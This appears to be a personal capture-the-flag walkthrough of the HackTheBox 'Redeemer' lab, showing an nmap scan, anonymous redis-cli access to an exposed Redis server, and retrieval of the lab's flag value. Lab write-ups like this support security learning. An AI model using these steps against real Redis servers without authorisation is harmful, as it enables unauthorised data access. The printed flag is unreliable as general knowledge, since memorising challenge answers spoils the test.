---
title: "HackTheBox Starting Point: Redeemer Walkthrough"
date: 2025-02-04
description: 'This is my personal notes for HTB Redeemer Machine'
image: '/public/static/htb-cover.jpg'
authors: ['chjwoo']
tags: ["Redis", "Misconfiguration", "Anonymous Access"]
---

First spawn the machine, in this case my IP address is `10.129.155.170`

## Reconnaissance

Firstly, we start by scanning for open ports using `nmap` . This helps us identify available services and potential attack vectors.

```bash
└──╼ [★]$ nmap -sV -T5 -p- 10.129.155.170
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-04 00:53 CST
Warning: 10.129.155.170 giving up on port because retransmission cap hit (2).
Nmap scan report for 10.129.155.170
Host is up (0.16s latency).
Not shown: 64722 closed tcp ports (reset), 812 filtered tcp ports (no-response)
PORT     STATE SERVICE VERSION
6379/tcp open  redis   Redis key-value store 5.0.7

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 91.01 seconds
```

### Analysis

- The target has port `6379`  open, which is running `Redis Server 5.0.7`
- Redis is an in-memory key-value store, often used as a cache server
- If there is misconfigured, Redis can allow unauthorized access and manipulation of stored data

## Foothold

After doing enumeration we can attempt to connect to redis server using `redis-cli` tool

```bash
redis-cli -h 10.129.155.170
```

Once connected, we can see all the stored keys by using this command

```bash
10.129.155.170:6379> KEYS *
1) "temp"
2) "numb"
3) "stor"
4) "flag"
```

Since there is `flag` key, we attempt to retrieve the value

```bash
10.129.155.170:6379> GET flag
"03e1d2b376c37ab3f5319922053953eb"
```

## Flags

Finally we successfully retrieve the flag!

```bash
03e1d2b376c37ab3f5319922053953eb
```

## Useful Links

https://redis.io/learn/howtos/quick-start/cheat-sheet

https://quickref.me/redis.html